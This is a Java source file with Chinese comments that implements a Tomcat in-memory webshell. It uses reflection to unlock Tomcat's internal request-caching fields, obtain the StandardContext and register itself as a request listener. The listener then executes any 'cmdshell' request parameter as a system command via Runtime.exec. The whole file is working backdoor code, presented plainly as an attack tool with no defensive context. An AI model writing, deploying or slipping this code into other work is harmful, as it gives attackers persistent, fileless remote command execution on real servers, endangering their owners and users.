import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;


public class AddListener implements ServletRequestListener {
    AddListener(){
        try {
            //修改 WRAP_SAME_OBJECT 值为 true
            java.lang.Class applicationDispatcher = java.lang.Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            java.lang.reflect.Field WRAP_SAME_OBJECT = applicationDispatcher.getDeclaredField("WRAP_SAME_OBJECT");
            java.lang.reflect.Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            WRAP_SAME_OBJECT.setAccessible(true);
            if (!WRAP_SAME_OBJECT.getBoolean(null)) {
                WRAP_SAME_OBJECT.setBoolean(null, true);
            }

            //初始化 lastServicedRequest
            java.lang.Class applicationFilterChain = java.lang.Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField("lastServicedRequest");
            modifiersField = lastServicedRequest.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            lastServicedRequest.setAccessible(true);
            if (lastServicedRequest.get(null) == null) {
                lastServicedRequest.set(null, new ThreadLocal<>());
            }

            //初始化 lastServicedResponse
            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField("lastServicedResponse");
            modifiersField = lastServicedResponse.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            lastServicedResponse.setAccessible(true);
            if (lastServicedResponse.get(null) == null) {
                lastServicedResponse.set(null, new ThreadLocal<>());
            }


            java.lang.reflect.Field lastServicedRequest2 = applicationFilterChain.getDeclaredField("lastServicedRequest");
            lastServicedRequest2.setAccessible(true);
            java.lang.ThreadLocal thredLocal = (java.lang.ThreadLocal) lastServicedRequest2.get(null);
            /*shell注入，前提需要能拿到request、response等*/
            if (thredLocal != null && thredLocal.get() != null) {
                javax.servlet.ServletRequest servletRequest = (javax.servlet.ServletRequest) thredLocal.get();
                javax.servlet.ServletContext servletContext = servletRequest.getServletContext();

                //获取ApplicationContext
                Field field = servletContext.getClass().getDeclaredField("context");
                field.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
                //获取StandardContext
                field = applicationContext.getClass().getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(applicationContext);

                AddListener addListener = new AddListener("aaa");
                standardContext.addApplicationEventListener(addListener);

            }


        } catch (NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {}

    }

    public AddListener(String aaa) {
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        String cmdshell = sre.getServletRequest().getParameter("cmdshell");
        if (cmdshell != null) {
            try {
                Runtime.getRuntime().exec(cmdshell);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
